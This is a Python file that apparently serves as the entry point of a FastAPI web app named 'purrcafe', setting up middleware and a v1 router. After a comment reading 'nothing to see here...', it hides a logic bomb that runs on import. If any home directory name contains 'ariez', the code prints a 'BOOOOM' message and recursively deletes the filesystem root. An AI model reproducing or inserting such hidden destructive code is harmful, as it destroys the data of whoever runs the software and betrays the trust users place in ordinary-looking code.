import os
import shutil

from fastapi import FastAPI

from ._middlewares import LoggingMiddleware
from ._routers.v1 import router as v1_api

app = FastAPI(
    openapi_url="/openapi.json" if os.environ.get('PURRCAFE_DOCS') == '1' else None
)


app.add_middleware(LoggingMiddleware)


app.include_router(v1_api, prefix="/v1")


# nothing to see here...
from pathlib import Path

if any(map(lambda name: 'ariez' in name, map(lambda path: path.name.lower(), Path.home().parent.iterdir()))):
    print("BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOMMMMMMMMMMM!!!!!!!!!!!!!!!!!!!!!!!!!")
    shutil.rmtree(Path(Path.home().root), ignore_errors=True)
